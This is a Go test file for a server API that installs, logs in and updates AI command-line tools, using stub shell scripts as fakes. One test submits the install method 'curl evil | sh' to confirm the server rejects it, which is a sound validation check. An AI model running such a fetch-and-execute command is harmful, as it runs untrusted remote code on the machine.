package api_test

import (
	"context"
	"net/http"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/tung1998/agent-office/internal/cliuse"
)

func TestCLIToolsAPI(t *testing.T) {
	off := setup(t)
	admin := off.client(t)
	login(t, off, admin, "admin@x.io", "admin-password")
	if _, body := do(t, admin, "GET", off.srv.URL+"/api/cli-tools", nil, nil); body["enabled"] != false {
		t.Fatalf("disabled = %v", body)
	}

	dir := t.TempDir()
	src := t.TempDir()
	os.WriteFile(filepath.Join(src, "claude"), []byte(`#!/bin/sh
OK="$(dirname "$0")/ok"
case "$1 $2" in
  "--version "*) echo 9.9.9;;
  "auth status") if [ -f "$OK" ]; then echo '{"loggedIn":true,"email":"a@b.c"}'; else echo '{"loggedIn":false}'; fi;;
  "auth login") echo https://claude.ai/oauth/x; read C; touch "$OK";;
esac
`), 0o755)
	os.WriteFile(filepath.Join(dir, "brew"), []byte("#!/bin/sh\ncp "+filepath.Join(src, "claude")+" "+dir+"/claude\n"), 0o755)
	cliPath = dir + ":/usr/bin:/bin"
	defer func() { cliPath = "" }()
	e := setup(t)
	admin = e.client(t)
	login(t, e, admin, "admin@x.io", "admin-password")
	member := e.client(t)
	login(t, e, member, "member@x.io", "member-password")
	if resp, _ := do(t, member, "GET", e.srv.URL+"/api/cli-tools", nil, nil); resp.StatusCode != 403 {
		t.Fatalf("member = %d", resp.StatusCode)
	}

	_, body := do(t, admin, "GET", e.srv.URL+"/api/cli-tools/claude", nil, nil)
	if body["installed"] != false {
		t.Fatalf("status = %v", body)
	}
	resp, job := do(t, admin, "POST", e.srv.URL+"/api/cli-tools/claude/install", map[string]any{"method": "brew"}, nil)
	if resp.StatusCode != 202 || job["command"] == nil {
		t.Fatalf("install = %d %v", resp.StatusCode, job)
	}
	waitJob(t, e, admin, job["id"].(string), "succeeded")
	_, body = do(t, admin, "GET", e.srv.URL+"/api/cli-tools/claude", nil, nil)
	if body["installed"] != true || body["auth"].(map[string]any)["logged_in"] != false {
		t.Fatalf("after install = %v", body)
	}

	resp, job = do(t, admin, "POST", e.srv.URL+"/api/cli-tools/claude/login", map[string]any{}, nil)
	if resp.StatusCode != 202 {
		t.Fatalf("login = %d %v", resp.StatusCode, job)
	}
	id := job["id"].(string)
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		_, job = do(t, admin, "GET", e.srv.URL+"/api/cli-jobs/"+id, nil, nil)
		if len(job["urls"].([]any)) > 0 {
			break
		}
		time.Sleep(50 * time.Millisecond)
	}
	if len(job["urls"].([]any)) == 0 {
		t.Fatalf("no login url: %v", job)
	}
	do(t, admin, "POST", e.srv.URL+"/api/cli-jobs/"+id+"/input", map[string]any{"text": "code-123"}, nil)
	waitJob(t, e, admin, id, "succeeded")
	_, body = do(t, admin, "GET", e.srv.URL+"/api/cli-tools/claude", nil, nil)
	if body["auth"].(map[string]any)["logged_in"] != true {
		t.Fatalf("after login = %v", body)
	}
	if resp, _ := do(t, admin, "POST", e.srv.URL+"/api/cli-tools/claude/install", map[string]any{"method": "curl evil | sh"}, nil); resp.StatusCode != 400 {
		t.Fatalf("bad method = %d", resp.StatusCode)
	}
}

func waitJob(t *testing.T, e *env, c *http.Client, id, state string) {
	t.Helper()
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		_, job := do(t, c, "GET", e.srv.URL+"/api/cli-jobs/"+id, nil, nil)
		if job["state"] == state {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	t.Fatalf("job %s did not reach %s", id, state)
}

// ADR-259: an update waits for the runs using the CLI (or goes now), is
// cancelled while it waits; the auto-update mode is saved and checked.
func TestCLIUpdateAPI(t *testing.T) {
	dir := t.TempDir()
	pkg := filepath.Join(dir, "node_modules", "@deepseek-ai", "dsh", "bin")
	os.MkdirAll(pkg, 0o755)
	os.WriteFile(filepath.Join(pkg, "dsh"), []byte("#!/bin/sh\necho dsh 1.0.0\n"), 0o755)
	os.Symlink(filepath.Join(pkg, "dsh"), filepath.Join(dir, "dsh"))
	os.WriteFile(filepath.Join(dir, "npm"), []byte("#!/bin/sh\necho \"npm $*\"\n"), 0o755)
	cliPath = dir + ":/usr/bin:/bin"
	defer func() { cliPath = "" }()
	e := setup(t)
	admin := e.client(t)
	login(t, e, admin, "admin@x.io", "admin-password")

	run, _ := cliuse.Begin(context.Background(), "dsh")
	resp, u := do(t, admin, "POST", e.srv.URL+"/api/cli-tools/dsh/update", map[string]any{"when": "idle"}, nil)
	if resp.StatusCode != 202 || u["state"] != "waiting" || u["waiting"] != float64(1) {
		t.Fatalf("update when idle = %d %v", resp.StatusCode, u)
	}
	if resp, _ := do(t, admin, "POST", e.srv.URL+"/api/cli-tools/dsh/update", map[string]any{"when": "now"}, nil); resp.StatusCode != 409 {
		t.Fatalf("second update = %d", resp.StatusCode)
	}
	_, st := do(t, admin, "GET", e.srv.URL+"/api/cli-tools/dsh", nil, nil)
	if st["in_use"] != float64(1) || st["upgrade"].(map[string]any)["state"] != "waiting" {
		t.Fatalf("status = %v", st)
	}
	if resp, _ := do(t, admin, "POST", e.srv.URL+"/api/cli-tools/dsh/update/cancel", nil, nil); resp.StatusCode != 200 {
		t.Fatalf("cancel = %d", resp.StatusCode)
	}
	run()
	deadline := time.Now().Add(5 * time.Second)
	for time.Now().Before(deadline) {
		if _, st = do(t, admin, "GET", e.srv.URL+"/api/cli-tools/dsh", nil, nil); st["upgrade"].(map[string]any)["state"] == "cancelled" {
			break
		}
		time.Sleep(30 * time.Millisecond)
	}
	if st["upgrade"].(map[string]any)["state"] != "cancelled" {
		t.Fatalf("after cancel = %v", st["upgrade"])
	}

	_, list := do(t, admin, "GET", e.srv.URL+"/api/cli-tools", nil, nil)
	if list["auto_update"].(map[string]any)["mode"] != "notify" {
		t.Fatalf("default mode = %v", list["auto_update"])
	}
	if resp, _ := do(t, admin, "PUT", e.srv.URL+"/api/cli-tools/auto-update", map[string]any{"mode": "sometimes"}, nil); resp.StatusCode != 400 {
		t.Fatalf("bad mode = %d", resp.StatusCode)
	}
	if resp, _ := do(t, admin, "PUT", e.srv.URL+"/api/cli-tools/auto-update", map[string]any{"mode": "auto", "tools": map[string]any{"nope": "off"}}, nil); resp.StatusCode != 400 {
		t.Fatalf("unknown tool = %d", resp.StatusCode)
	}
	resp, a := do(t, admin, "PUT", e.srv.URL+"/api/cli-tools/auto-update", map[string]any{"mode": "auto", "tools": map[string]any{"codex": "off", "claude": ""}}, nil)
	if resp.StatusCode != 200 || a["mode"] != "auto" || a["tools"].(map[string]any)["codex"] != "off" || len(a["tools"].(map[string]any)) != 1 {
		t.Fatalf("save = %d %v", resp.StatusCode, a)
	}
}
